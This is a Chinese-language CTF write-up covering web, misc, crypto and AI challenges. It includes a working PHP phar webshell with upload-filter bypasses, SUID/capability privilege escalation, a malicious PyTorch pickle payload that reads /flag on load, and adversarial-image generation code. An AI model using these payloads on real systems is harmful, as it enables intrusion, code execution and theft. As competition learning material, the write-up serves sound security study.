Author: Po1nt
# web

##  snake game和拼夕夕

f12

## md5

搜索关键词md5弱比较

md5强比较


## babyrce

考点是怎么绕过preg_match
搜索关键词 空格绕过  preg_match绕过  rce
![[Pasted image 20251108173425.png]]
## Infoleak

题目中提示我们是一道信息收集的题目

dirsarch扫一下

扫出来一个二进制文件，可以上网搜怎么打开二进制文件
可以用一些工具看
这里附上一个在线查看工具
[使用在线文件查看器在浏览器中在线打开和查看文件](https://filext.com/zh/online-file-viewer.html)
直接看得到flag的路径


##   mambo's blog

先目录遍历找到app.py源码
看到session用伪随机数生成的，直接伪造
/sys/class/net/eth0/address这里看到mac地址，得到种子
直接生成伪随机数然后伪造一个session

## present

考点：代码审计，ssrf，伪协议，url绕过
先用伪协议绕过第一关
第二关和第三关
url绕一下，正常一个url的标准格式为
```
https://user:pass@www.example.com:8080/path/to/resource?query=param#fragment
```
那么http://www.dino209.cn@我的ip就可以实现ssrf 
在我的服务器上写下thankuforurgift
直接过关
文件包含flag.php


## 盗走你的qq

考点：弱密码爆破

密码p@ssword



## hardcar

![[Pasted image 20251108151427.png]]
先ping一下，拿到ip

```
http://110.42.47.145:32860/login.php
```
访问一下可以拿到源码
![[Pasted image 20251108151527.png]]
源码里直接写密码直接进

看到一个阅读一个上传文件，一眼要上马

通过上面的手法同样拿到源码后发现正常文件上传的
\<?php \<?  \<% \<script language=php>
都被ban了
用
```php
<?php $phar = new Phar('exploit.phar'); 
$phar->startBuffering(); 
$stub = <<<'STUB' 
<?php 
eval('$_post[1]'); 
__HALT_COMPILER();
?> 
STUB; 

$phar->setStub($stub); 
$phar->addFromString('test.txt', 'test'); 
$phar->stopBuffering(); 
?>
```
生成个phar文件
再gzip打包一下
要检查的关键字就全部消失了

然后注意一下他可能打包之后有$
但是我们可以通过添加空格的方式来不让他打包出$

然后了解一下include的底层逻辑，他回识别名字中的.phar
然后把他当作压缩包解压后的内容include进去，
所以我们可以使用刚刚的压缩包直接上传
名字叫 111.phar.png
就能绕过后缀检查

然后直接上马
![[Pasted image 20251108153055.png]]

![[Pasted image 20251108153110.png]]
弹个shell

![[Pasted image 20251108155422.png]]
![[Pasted image 20251108155429.png]]
ok
拿到shell了
![[Pasted image 20251108155451.png]]

我们发现root目录权限不够，可能有点东西,想办法提权
把我的linpeas传上去
![[Pasted image 20251108161016.png]]

![[Pasted image 20251108161025.png]]

![[Pasted image 20251108161921.png]]

找到PHP 可执行文件具有 **`CAP_SETUID` 能力（capability）**，并且以 **effective + permitted（+ep）** 方式设置。

这是 **Linux capabilities** 机制的一部分，允许非 root 进程拥有某些 root 特权，而不必以 root 身份运行整个程序。

![[Pasted image 20251108161910.png]]
拿到flag

##  dusk file manager

首先拿到项目之后我们先看看文件名称，找找有什么比较有用
例如index.php
auth.php
setting.php
login-callback.php
register.php
等有关登录逻辑，鉴权，初始化的东西
怎么登录
首先看看index.php的登录逻辑
![[Pasted image 20251108162651.png]]
我们看到登录过程中，每一步都需要认证我们的身份，并且，我们还不能注册合法账号，没有可以供我们利用的，但是注意到这个开头有一个
```
$allowed_levels = array(9, 8, 7, 0);  
和
require_once 'bootstrap.php';
```

我们跟进这个bootstrap.php
发现是一个初始化的入口
不了了之了

第一行它定义了四个用户组
我们思考，是什么来鉴定用户组的权限的呢？
注意到他把这个数组赋给了变量$allowed_levels
我们全局搜索allowed_levels
![[Pasted image 20251108163745.png]]
找到header.php
发现在这里有来鉴定用户组
![[Pasted image 20251110125953.png]]

这里鉴定用户组
我们全局搜索什么地方引入了header.php
![[Pasted image 20251108164138.png]]
找到了setting.php（设置）
可能跟一些权限有关


但是更有意思的是
在这个设置中所有的执行逻辑都在这个header.php前![[Pasted image 20251108164230.png]]
整个代码先执行，再去include   header.php
有逻辑漏洞。
![[Pasted image 20251108164631.png]]
重点在这，在设置中，我们可以控制用户可不可以注册，可不可以无需审核自行创建账号。所以我们可以自行创建账号
先修改设置
![[Pasted image 20251110133657.png]]


我们再去regisrer.php看看注册逻辑
![[Pasted image 20251108165050.png]]
修改设置之后去这个注册路由注册一个账号
就可以登陆了
我们注册一个账号
![[Pasted image 20251110133721.png]]
![[Pasted image 20251110133800.png]]


登陆上之后,就可以打一个正常的文件上传了
![[Pasted image 20251108171243.png]]
看这里

我们还可以更改上传文件的白名单，我们先修改.htaccess配置文件
![[Pasted image 20251110140648.png]]



然后上传一个
![[Pasted image 20251110140742.png]]


再上个马，直接蚁剑连
![[Pasted image 20251110141300.png]]
发现已经被解析了
发现权限不够看不了flag
![[Pasted image 20251110141513.png]]

发现suid可以提权哦
![[24844fafd1ef89aeb56978a9c2c4c5be.png]]
发现suid可以提权哦



grep提权![[Pasted image 20251108171640.png]]

grep "{" /flag
直接拿
![[Pasted image 20251110141544.png]]






# MISC

##   Dusk的秘密

掩码爆破直接爆破，直接出
##  Interesting ZIP
第一关直接爆破只有数字

第二关在键盘上围起来的字母得到压缩包的密码
![[Pasted image 20251108140625.png]]
真的什么都

00101101011000100100111000111001011011100101010001101011010001110011010101011110010111000110010100100110010111110011001000111100

~~没有~~

中间有东西
翻译
-bN9nTkG5^ \e&_2<

![[Pasted image 20251108140705.png]]


##  Malware

游戏通关
everything找一下一个clue.jpg 发现打不开，文本查看是7z头
多层嵌套文件夹只有7-3是有东西的
密码password
![[Pasted image 20251108142256.png]]
这个base64解开是一个文件夹 everything找一下
有一个readme.exe和runme.txt
exe文件需要密码不知道，正常反编译下，但我直接变成txt直接读明文
![[Pasted image 20251108142717.png]]
有密钥和要解的内容
在![[Pasted image 20251108142739.png]]
直接解

##   Math Master
![[Pasted image 20251108143025.png]]


直接找ai写脚本
最后拿shell 拿flag

## ROSE

先看流量包然后找到\xaa
\xab\xac\xad
发现有png头拼起来变成png
![[Pasted image 20251108144534.png]]
![[Pasted image 20251108144543.png]]

## story

得到的一个文件名字是一段密文，发现是gif动图里有一段，用010打开还有一段
拿到密码
两张图片
直接重合拿到密码
获得一个大小写混合的小故事，大写1小写0 是二进制数据，拿到flag

# Crypto
全部ai一把嗦



# AI

##  0 - MNIST! 简单的开始!
```python
import os  
import time  
import cv2  
import numpy as np  
import requests  
import re  
from selenium import webdriver  
from selenium.webdriver.chrome.options import Options  
from selenium.webdriver.chrome.service import Service  
from selenium.webdriver.common.by import By  
from webdriver_manager.chrome import ChromeDriverManager  
  
# ---------- 配置 ----------BASE_URL = "http://dino-ctf-chal.kengwang.com.cn:32872"  
MODEL_PATH = "mnist_cnn.h5"  
  
# ---------- 自动训练模型（仅首次）----------  
if not os.path.exists(MODEL_PATH):  
    print("🧠 正在训练本地 MNIST 模型（约需1-2分钟）...")  
    from tensorflow.keras.datasets import mnist  
    from tensorflow.keras.models import Sequential  
    from tensorflow.keras.layers import Conv2D, MaxPooling2D, Flatten, Dense  
    from tensorflow.keras.utils import to_categorical  
  
    (x_train, y_train), _ = mnist.load_data()  
    x_train = x_train.reshape(-1, 28, 28, 1).astype('float32') / 255.0  
    y_train = to_categorical(y_train, 10)  
  
    model = Sequential([  
        Conv2D(32, (3, 3), activation='relu', input_shape=(28, 28, 1)),  
        MaxPooling2D((2, 2)),  
        Conv2D(64, (3, 3), activation='relu'),  
        MaxPooling2D((2, 2)),  
        Flatten(),  
        Dense(64, activation='relu'),  
        Dense(10, activation='softmax')  
    ])  
    model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])  
    model.fit(x_train, y_train, epochs=3, batch_size=128, verbose=1)  
    model.save(MODEL_PATH)  
    print("✅ 模型训练完成")  
else:  
    from tensorflow.keras.models import load_model  
    model = load_model(MODEL_PATH)  
    print("✅ 已加载本地模型")  
  
# ---------- 图像识别 ----------def predict_digit_from_bytes(img_bytes):  
    nparr = np.frombuffer(img_bytes, np.uint8)  
    img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)  
    if img is None:  
        raise Exception("图片解码失败")  
    img = cv2.resize(img, (28, 28))  
    img = img.astype('float32') / 255.0  
    img = np.expand_dims(img, axis=0)  
    img = np.expand_dims(img, axis=-1)  
    pred = model.predict(img, verbose=0)  
    return int(np.argmax(pred))  
  
# ---------- 启动无头浏览器 ----------print("🚀 启动无头浏览器...")  
chrome_options = Options()  
chrome_options.add_argument("--headless")  
chrome_options.add_argument("--no-sandbox")  
chrome_options.add_argument("--disable-dev-shm-usage")  
chrome_options.add_argument("--disable-gpu")  
chrome_options.add_argument("--window-size=1920,1080")  
service = Service(ChromeDriverManager().install())  
driver = webdriver.Chrome(service=service, options=chrome_options)  
  
session = requests.Session()  # 保持 cookies  
try:  
    for attempt in range(1, 1001):  # 最多 1000 次  
        print(f"\n🔄 第 {attempt} 次：获取题目...")  
        # 访问主页，加载图片  
        driver.get(BASE_URL)  
        time.sleep(0.5)  
  
        # 截图识别  
        img_elem = driver.find_element(By.ID, "qimg")  
        img_elem.screenshot("temp_digit.png")  
        with open("temp_digit.png", "rb") as f:  
            img_bytes = f.read()  
        digit = predict_digit_from_bytes(img_bytes)  
        print(f"🧠 识别结果: {digit}")  
  
        # 直接调用 /answer 接口并检查响应  
        answer_url = f"{BASE_URL}/answer?answer={digit}"  
        try:  
            resp = session.get(answer_url, timeout=10)  
            resp.raise_for_status()  
            try:  
                data = resp.json()  
            except:  
                data = {}  
  
            # 检查是否返回 FLAG            if 'flag' in data:  
                print("\n🎉 恭喜！FLAG 已获取：")  
                flag = data['flag']  
                print(f"   {flag}")  
                # 尝试自动提交到 flag 平台（如有需要可扩展）  
                exit(0)  
  
            # 打印当前状态（调试用）  
            total = data.get("total_attempts", "N/A")  
            correct = data.get("correct_attempts", "N/A")  
            remaining = data.get("remaining", "N/A")  
            print(f"📊 已答: {total}, 正确: {correct}, 剩余: {remaining}")  
  
        except Exception as e:  
            print(f"❌ 提交失败: {e}")  
            break  
  
        time.sleep(0.3)  
  
    print("\n⚠️ 已完成 1000 次答题，但未收到 FLAG。请检查正确率是否 ≥90%。")  
  
except Exception as e:  
    print(f"\n💥 脚本异常: {e}")  
  
finally:  
    driver.quit()  
    if os.path.exists("temp_digit.png"):  
        os.remove("temp_digit.png")  
    print("\n🏁 脚本结束。")
```


![[Pasted image 20251108172232.png]]



## 1 - 着火啦🔥！哪里有火？

```python
import torch  
import torch.nn as nn  
import torch.optim as optim  
from torchvision import datasets, transforms, models  
from torch.utils.data import DataLoader  
import os  
  
device = torch.device("cuda" if torch.cuda.is_available() else "cpu")  
print(f"Using device: {device}")  
  
transform = transforms.Compose([  
    transforms.Resize((224, 224)),  
    transforms.ToTensor(),  
    transforms.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225])  
])  
  
train_dataset = datasets.ImageFolder(root='dataset/train', transform=transform)  
train_loader = DataLoader(train_dataset, batch_size=8, shuffle=True)  # 小 batch 防止爆内存  
  
model = models.resnet18(pretrained=True)  
model.fc = nn.Linear(model.fc.in_features, 2)  
model = model.to(device)  
  
criterion = nn.CrossEntropyLoss()  
optimizer = optim.Adam(model.parameters(), lr=1e-4)  
  
print("开始训练（可能需要5-10分钟）...")  
for epoch in range(5):  # 只训练5轮，适合小数据  
    model.train()  
    total_loss = 0  
    for inputs, labels in train_loader:  
        inputs, labels = inputs.to(device), labels.to(device)  
        optimizer.zero_grad()  
        outputs = model(inputs)  
        loss = criterion(outputs, labels)  
        loss.backward()  
        optimizer.step()  
        total_loss += loss.item()  
    print(f'Epoch {epoch+1}/5, Loss: {total_loss/len(train_loader):.4f}')  
  
torch.save(model.state_dict(), 'fire_detection_model.pth')  
print("✅ 模型已保存为 fire_detection_model.pth")
```
先训练模型随便跑，正确率不重要
![[8abf728d79458696afde58fcfad393db.png]]

```python
import requests  
import torch  
from PIL import Image  
from torchvision import transforms  
import io  
import os  
import json  
  
# 创建错题文件夹  
os.makedirs("wrong_answers", exist_ok=True)  
  
# 加载模型（同前）  
device = torch.device("cpu")  
model = torch.hub.load('pytorch/vision:v0.10.0', 'resnet18', pretrained=False)  
model.fc = torch.nn.Linear(model.fc.in_features, 2)  
model.load_state_dict(torch.load('fire_detection_model.pth', map_location=device))  
model.eval()  
  
transform = transforms.Compose([  
    transforms.Resize((224, 224)),  
    transforms.ToTensor(),  
    transforms.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225])  
])  
  
  
def predict_image_from_bytes(img_bytes):  
    img = Image.open(io.BytesIO(img_bytes)).convert("RGB")  
    img_tensor = transform(img).unsqueeze(0)  
    with torch.no_grad():  
        output = model(img_tensor)  
        pred = output.argmax().item()  
    return "fire" if pred == 0 else "nofire"  
  
  
# 开始收集  
base_url = "http://dino-ctf-chal.kengwang.com.cn:32777"  
session = requests.Session()  
  
print("[+] 开始答题并收集错题...")  
  
for i in range(100):  # 先收 100 题错题  
    # 获取题目  
    img_resp = session.get(f"{base_url}/question")  
    if img_resp.status_code != 200:  
        break  
    img_bytes = img_resp.content  
  
    # 预测  
    answer = predict_image_from_bytes(img_bytes)  
  
    # 提交  
    resp = session.get(f"{base_url}/answer", params={"answer": answer})  
    try:  
        data = resp.json()  
        correct = data.get("correct", False)  
        if not correct:  
            # 保存错题图片  
            filename = f"wrong_answers/wrong_{i + 1}_{answer}.jpg"  
            with open(filename, "wb") as f:  
                f.write(img_bytes)  
            print(f"❌ 保存错题: {filename}")  
        else:  
            print(f"✅ 第 {i + 1} 题答对")  
    except:  
        print("解析失败")  
        break  
  
print("✅ 错题收集完成！请检查 wrong_answers 文件夹")
```

使用这个脚本从题库里扒原题，手动分类重新训练模型

```python
import requests  
import torch  
from PIL import Image  
from torchvision import transforms  
import io  
import json  
import re  
  
# ===== 1. 加载模型 =====device = torch.device("cpu")  
model = torch.hub.load('pytorch/vision:v0.10.0', 'resnet18', pretrained=False)  
model.fc = torch.nn.Linear(model.fc.in_features, 2)  
model.load_state_dict(torch.load('fire_detection_model.pth', map_location=device))  
model.eval()  
  
transform = transforms.Compose([  
    transforms.Resize((224, 224)),  
    transforms.ToTensor(),  
    transforms.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225])  
])  
  
def predict_image_from_bytes(img_bytes):  
    img = Image.open(io.BytesIO(img_bytes)).convert("RGB")  
    img_tensor = transform(img).unsqueeze(0)  
    with torch.no_grad():  
        output = model(img_tensor)  
        pred = output.argmax().item()  
    return "fire" if pred == 0 else "nofire"  
  
# ===== 2. 主程序 =====base_url = "http://dino-ctf-chal.kengwang.com.cn:32777"  
session = requests.Session()  
  
print("[+] 开始答题...")  
  
total = 0  
correct = 0  
max_questions = 500  
  
while total < max_questions:  
    print(f"\n[第 {total+1} 题]")  
  
    # (1) 获取题目图片  
    try:  
        img_resp = session.get(f"{base_url}/question", timeout=10)  
        if img_resp.status_code != 200:  
            print(f"❌ 获取图片失败，状态码: {img_resp.status_code}")  
            break  
        img_bytes = img_resp.content  
        print("✅ 成功获取图片")  
    except Exception as e:  
        print(f"❌ 错误: {e}")  
        break  
  
    # (2) AI 预测  
    answer = predict_image_from_bytes(img_bytes)  
    print(f"🤖 AI 预测: {answer}")  
  
    # (3) 提交答案  
    try:  
        answer_resp = session.get(f"{base_url}/answer", params={"answer": answer}, timeout=10)  
        print(f"📤 提交答案，状态码: {answer_resp.status_code}")  
  
        # 解析 JSON 响应  
        resp_json = answer_resp.json()  
        correct_this_time = resp_json.get("correct", False)  
        correct_attempts = resp_json.get("correct_attempts", 0)  
        remaining = resp_json.get("remaining", 0)  
        total_attempts = resp_json.get("total_attempts", 0)  
  
        if correct_this_time:  
            correct += 1  
            print(f"✅ 答对！累计正确: {correct_attempts} / {total_attempts}")  
        else:  
            print(f"❌ 答错！累计正确: {correct_attempts} / {total_attempts}")  
  
        # 检查是否满足条件（连续500或90%正确率）  
        if correct_attempts >= 500:  
            print("\n🎉🎉🎉 已连续答对 500 题！")  
        elif total_attempts > 0 and correct_attempts / total_attempts >= 0.9:  
            print(f"\n🎉🎉🎉 正确率达到 {correct_attempts/total_attempts:.2%}！")  
  
        # 检查 FLAG（可能在响应中）  
        flag_match = re.search(r'(D1no\{.*?\}|flag\{.*?\})', answer_resp.text)  
        if flag_match:  
            print("\n🎉🎉🎉 实时捕获 FLAG！")  
            print("FLAG:", flag_match.group(1))  
            exit()  
  
        total = total_attempts  # 更新 total 为服务器记录的总次数  
  
    except Exception as e:  
        print(f"❌ 解析响应失败: {e}")  
        break  
  
    # (4) 检查是否还有剩余次数  
    if remaining <= 0:  
        print(f"\n🛑 剩余答题次数为 0，停止答题。")  
        break  
  
    # 可选：加一点延迟  
    # time.sleep(0.2)  
  
# ===== 3. 最终总结 =====accuracy = correct / total if total > 0 else 0  
print(f"\n🔚 答题结束！总共答题: {total}，答对: {correct}，正确率: {accuracy:.2%}")  
  
# 再请求一次主页，看是否有 FLAGprint("\n🔄 尝试访问主页查看最终状态...")  
home_resp = session.get(base_url)  
flag_in_home = re.search(r'(D1no\{.*?\}|flag\{.*?\})', home_resp.text)  
if flag_in_home:  
    print("🎉 主页中发现 FLAG！")  
    print("FLAG:", flag_in_home.group(1))  
else:  
    print("📌 主页内容预览（前500字符）:")  
    print(home_resp.text[:500])  
  
# 打印最后一次响应（供你手动检查）  
print("\n🔍 最后一次 /answer 响应全文:")  
print("=" * 50)  
print(answer_resp.text)  
print("=" * 50)
```



直接答题
![[46c2c5af81d2febdf924da6982b4aad9.png]]
正确率
高达96.80哈哈哈哈哈哈哈



## 2 - 着火啦🔥! 快来看看!

```python
# jpg_exploit.py  
import torch  
import torchvision.models as models  
  
  
class JpgExploit:  
    def __reduce__(self):  
        # 执行恶意代码，写入 JPG 文件  
        code = '''  
import os  
try:  
    if os.path.exists("/flag"):        flag_content = open("/flag", "r").read().strip()  
        # 创建一个合法的 JPEG 文件头 + flag 内容  
        # JPEG 文件头：SOI (Start of Image)  
        jpg_header = b"\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x01\\x00\\x00"  
  
        # 将 flag 内容追加到 JPEG 文件中  
        file_path = "/app/images/flag.jpg"        with open(file_path, "wb") as f:            f.write(jpg_header)            f.write(b"\\n<!-- FLAG: " + flag_content.encode('utf-8') + b" -->\\n")  
            f.write(b"\\n" + flag_content.encode('utf-8') + b"\\n")  
  
        # 验证文件是否创建成功  
        if os.path.exists(file_path):            print("✅ Flag JPG file created successfully!")        else:            print("❌ Failed to create flag JPG file!")except Exception as e:  
    print(f"❌ Error creating JPG: {str(e)}")'''  
        exec(code)  
  
        # 返回一个完整的 state_dict，确保模型加载成功  
        model = models.mobilenet_v2(pretrained=False)  
        model.classifier[1] = torch.nn.Sequential(  
            torch.nn.Linear(model.last_channel, model.last_channel // 2),  
            torch.nn.BatchNorm1d(model.last_channel // 2),  
            torch.nn.ReLU(),  
            torch.nn.Dropout(0.5),  
            torch.nn.Linear(model.last_channel // 2, 2)  
        )  
  
        state_dict = model.state_dict()  
        return (dict, (state_dict,))  
  
  
torch.save(JpgExploit(), 'exploit_model.pth')
```



![[Pasted image 20251107135421.png]]


##  3 - 着火了吗?🔥

```python
import torch  
import os  
from PIL import Image  
import numpy as np  
from torchvision import transforms  
from skimage.metrics import structural_similarity as ssim  
from art.estimators.classification import PyTorchClassifier  
from art.attacks.evasion import ProjectedGradientDescent  
  
# ==================== 设置路径 ====================DATASET_DIR = "dataset"  # 数据集文件夹名  
MODEL_PATH = "best_fire_detection_model.pth"  # 模型文件名  
OUTPUT_DIR = "attack"  # 输出攻击图片的文件夹  
MAX_IMAGES = 25  # 总共生成25张（保证超过20张）  
  
# ==================== 加载模型 ====================device = torch.device("cuda" if torch.cuda.is_available() else "cpu")  
  
model = torch.hub.load('pytorch/vision:v0.10.0', 'mobilenet_v2', pretrained=False)  
model.classifier[1] = torch.nn.Sequential(  
    torch.nn.Linear(model.last_channel, model.last_channel // 2),  
    torch.nn.BatchNorm1d(model.last_channel // 2),  
    torch.nn.ReLU(),  
    torch.nn.Dropout(0.5),  
    torch.nn.Linear(model.last_channel // 2, 2)  
)  
model.load_state_dict(torch.load(MODEL_PATH, map_location=device))  
model.eval().to(device)  
  
# 准备 ART 工具（用于生成对抗样本）  
classifier = PyTorchClassifier(  
    model=model,  
    clip_values=(0, 1),  
    loss=torch.nn.CrossEntropyLoss(),  
    input_shape=(3, 224, 224),  
    nb_classes=2  
)  
  
attack = ProjectedGradientDescent(  
    estimator=classifier,  
    eps=0.03,  # 扰动幅度（太大会变样，太小无效）  
    eps_step=0.005,  
    max_iter=30,  
    targeted=True  
)  
  
transform = transforms.Compose([  
    transforms.Resize((224, 224)),  
    transforms.ToTensor()  
])  
  
# ==================== 生成对抗样本 ====================os.makedirs(f"{OUTPUT_DIR}/fire", exist_ok=True)  
os.makedirs(f"{OUTPUT_DIR}/nofire", exist_ok=True)  
  
  
def generate_adv_image(img_path, target_label, output_path):  
    # 读取原始图片  
    orig_img = Image.open(img_path).convert('RGB')  
    orig_tensor = transform(orig_img).unsqueeze(0).to(device)  
  
    # 生成对抗样本  
    adv_array = attack.generate(x=orig_tensor.cpu().numpy(), y=np.array([target_label]))  
    adv_tensor = torch.tensor(adv_array[0])  
  
    # 转换为图片  
    adv_img = transforms.ToPILImage()(adv_tensor)  
    adv_img.save(output_path)  
  
    # 计算相似度（必须 >= 0.85）  
    orig_gray = np.array(orig_img.convert('L').resize((224, 224)))  
    adv_gray = np.array(adv_img.convert('L'))  
    similarity = ssim(orig_gray, adv_gray)  
  
    return similarity  
  
  
# 生成攻击图片：把火灾图片改成“被误判为非火灾”  
count = 0  
for img_name in os.listdir(f"{DATASET_DIR}/fire"):  
    if count >= MAX_IMAGES // 2:  
        break  
    img_path = f"{DATASET_DIR}/fire/{img_name}"  
    output_path = f"{OUTPUT_DIR}/fire/{img_name}"  
    sim = generate_adv_image(img_path, target_label=1, output_path=output_path)  
    print(f"✅ {img_name} (火灾) → 生成对抗图，相似度: {sim:.3f}")  
    count += 1  
  
# 生成攻击图片：把非火灾图片改成“被误判为火灾”  
for img_name in os.listdir(f"{DATASET_DIR}/nofire"):  
    if count >= MAX_IMAGES:  
        break  
    img_path = f"{DATASET_DIR}/nofire/{img_name}"  
    output_path = f"{OUTPUT_DIR}/nofire/{img_name}"  
    sim = generate_adv_image(img_path, target_label=0, output_path=output_path)  
    print(f"✅ {img_name} (非火灾) → 生成对抗图，相似度: {sim:.3f}")  
    count += 1  
  
print(f"\n🎉 所有对抗图片已生成！共 {count} 张，保存在 {OUTPUT_DIR} 文件夹中。")
```



![[Pasted image 20251108173017.png]]



